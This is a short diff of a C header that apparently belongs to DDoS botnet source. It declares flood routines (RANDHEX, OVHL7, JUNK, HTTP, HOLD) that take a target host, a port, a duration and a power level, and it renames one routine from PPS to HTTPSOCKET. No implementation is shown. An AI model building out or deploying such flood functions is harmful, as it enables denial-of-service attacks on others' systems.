@@ -106,6 +106,6 @@ void			RANDHEX(unsigned char *ip, int port, int secs);
 void			OVHL7(char *host, in_port_t port, int timeEnd, int power);
 void			JUNK(unsigned char *ip, int port, int end_time);
 void			HTTP(char *method, char *host, in_port_t port, char *path, int timeEnd, int power);
-void			PPS(char *host, in_port_t port, int timeEnd, int power);
+void			HTTPSOCKET(char *host, in_port_t port, int timeEnd, int power);
 void			HOLD(unsigned char *ip, int port, int end_time);
 #endif
